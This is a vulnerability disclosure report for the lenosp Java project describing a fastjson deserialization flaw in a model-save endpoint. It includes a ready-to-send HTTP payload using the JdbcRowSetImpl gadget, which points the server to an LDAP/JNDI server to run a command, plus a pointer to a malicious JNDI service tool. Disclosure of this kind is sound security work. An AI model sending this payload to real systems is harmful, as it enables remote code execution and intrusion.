# Project

Address: [lenosp](https://gitee.com/zzdevelop/lenosp)

# 1. Deserialization vulnerability

[Suggested description]

The deserialization vulnerability is due to the introduction of an insecure version of the fastjson component into the system.

[Vendor of Product]

https://gitee.com/zzdevelop/lenosp.git

[Affected Product Code Base]

ALL

[Affected Component]

/service/model/{modelId}/save

[The payload]

```
POST /service/model/1/save HTTP/1.1
Host: localhost:8081
Cookie: JSESSIONID=1b7c1461-8732-446c-8426-528ebc8890e2
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 276

{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://0.0.0.0:1389/Basic/Command/calc",
        "autoCommit":true
    }
}
```


[Vulnerability recurrence]

First we need to prepare a server to start a malicious [JNDI](https://github.com/WhiteHSBG/JNDIExploit) service.

![25b3fce6d1d6cc541f306054fa2af39](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/e4df3d6e-6fcb-4b2d-a225-6e7d99ab57a9)

![08945a3ce201dc182bb0e8310191643](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/bfd38628-5d56-4551-86b4-cd318d4033bf)

[Code analysis]

The deserialization vulnerability is due to the introduction of an insecure version of the fastjson component into the system.

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/4cb65385-4dbc-466d-a45c-96befa356ff7)

![image](https://github.com/By-Yexing/Vulnerability_JAVA/assets/107806521/4225988c-eff4-4683-8e6b-8254d1fa11d5)




